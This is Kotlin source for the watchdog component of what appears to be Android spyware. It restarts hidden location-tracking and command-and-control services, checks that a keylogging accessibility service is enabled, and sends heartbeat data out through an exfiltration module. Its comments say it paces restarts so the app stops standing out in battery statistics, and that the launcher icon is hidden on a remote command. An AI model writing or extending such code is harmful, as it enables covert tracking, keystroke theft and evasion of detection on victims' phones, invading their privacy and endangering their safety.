package com.sp.watchdog

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import com.sp.core.c2.Exfil
import com.sp.core.services.C2Service
import com.sp.core.services.LocationService
import com.sp.core.stealth.AntiDetect
import com.sp.core.stealth.IconHider
import com.sp.core.util.Prefs

/**
 * Watchdog with exponential back-off.
 *
 * Every system broadcast used to trigger an immediate service restart, which
 * made the app an obvious battery/statistics outlier. Now:
 *  - a cool-down window is respected (next allowed run is persisted)
 *  - the interval grows exponentially while the service stays dead
 *  - the alarm interval follows the back-off instead of a fixed 60s tick
 */
object HealthCheck {
    private const val TAG = "HealthCheck"
    private const val KEY_FAILS = "hc_fails"
    private const val KEY_NEXT_RUN = "hc_next_run"

    const val BASE_INTERVAL_MS = 60_000L
    const val MAX_INTERVAL_MS = 30 * 60_000L

    fun run(ctx: Context, force: Boolean = false) {
        val now = System.currentTimeMillis()

        if (!force) {
            val next = Prefs.get(ctx, KEY_NEXT_RUN, 0L) as Long
            if (now < next) return
        }

        if (AntiDetect.isCompromised(ctx)) return

        val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager

        val locOk = isRunning(am, LocationService::class.java.name)
        val c2Ok = isRunning(am, C2Service::class.java.name)

        if (!locOk) restart(ctx, LocationService::class.java)
        if (!c2Ok) restart(ctx, C2Service::class.java)

        if (!isAccessibilityEnabled(ctx)) {
            Exfil.sendLog(ctx, "health", """{"acc":false,"ts":${System.currentTimeMillis()}}""")
        }

        val fails = if (locOk && c2Ok) 0 else (Prefs.get(ctx, KEY_FAILS, 0) as Int + 1).coerceAtMost(6)
        Prefs.set(ctx, KEY_FAILS, fails)

        val backoff = if (fails <= 0) BASE_INTERVAL_MS
        else (BASE_INTERVAL_MS shl (fails - 1).coerceIn(0, 5)).coerceAtMost(MAX_INTERVAL_MS)

        Prefs.set(ctx, KEY_NEXT_RUN, now + backoff)

        // The launcher icon is never hidden automatically - hiding it makes the
        // app impossible to start again. It is only hidden on the explicit
        // C2 command "hide".
        IconHider.show(ctx)
        WatchdogAlarm.arm(ctx, backoff)

        Exfil.sendLog(ctx, "heartbeat",
            """{"ts":${System.currentTimeMillis()},"sdk":${Build.VERSION.SDK_INT},"fails":$fails,"interval":$backoff}""")
        Log.i(TAG, "health ok=$locOk/$c2Ok fails=$fails next=${backoff}ms")
    }

    private fun isRunning(am: ActivityManager, name: String): Boolean {
        @Suppress("DEPRECATION")
        return am.getRunningServices(256).any { it.service.className == name }
    }

    private fun restart(ctx: Context, cls: Class<*>) {
        try {
            val i = Intent(ctx, cls)
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i) else ctx.startService(i)
        } catch (_: Throwable) {
        }
    }

    private fun isAccessibilityEnabled(ctx: Context): Boolean {
        val enabled = android.provider.Settings.Secure.getString(
            ctx.contentResolver,
            android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        return enabled.contains(ctx.packageName + "/.accessibility.KeylogService")
    }
}
